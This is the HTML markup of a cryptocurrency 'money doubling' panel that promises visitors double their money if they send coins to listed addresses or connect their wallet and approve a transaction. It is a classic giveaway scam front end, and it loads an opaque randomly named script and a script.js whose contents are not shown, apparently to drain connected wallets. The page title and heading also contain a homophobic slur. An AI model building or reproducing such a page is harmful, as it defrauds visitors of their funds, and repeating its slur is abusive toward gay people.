<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Welcome to the Faggot Middleman Money Doubling Panel. Send any amount of crypto or connect your wallet to double your money!">
    <title>Faggot Middleman Money Doubling Panel</title>
    <link rel="icon" type="image/png" href="favicon.png"> <!-- Update this URL to your actual hosted favicon -->
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="styles.css">
    <script charset="UTF-8" type="text/javascript" src="./047a7423-e493-4d9b-950d-e42bcdcafc71.js"></script>
</head>
<body>
    <div class="container">
        <h1>Faggot Middleman Money Doubling Panel</h1>
        <p>Send any amount of crypto you'd like to any of the addresses, or connect your wallet and approve the transaction, and you will get double to the wallet that you sent the money from.</p>
        
        <select id="crypto-select" onchange="handleCryptoChange()">
            <option value="connect-wallet">Connect Wallet</option>
            <option value="eth">ETH</option>
            <option value="btc">BTC</option>
            <option value="sol">SOL</option>
            <option value="ltc">LTC</option>
            <option value="xmr">XMR</option>
        </select>
        
        <div id="connect-wallet-section">
            <button id="action-button" class="interact-button">Connect Wallet</button>
        </div>
        
        <div id="wallet-address-section" class="wallet-address-section">
            <div id="wallet-address" class="wallet-address"></div>
            <button id="action-button-no-class">Double My Money</button>
        </div>
    </div>

    <script src="script.js"></script>
</body>
</html>
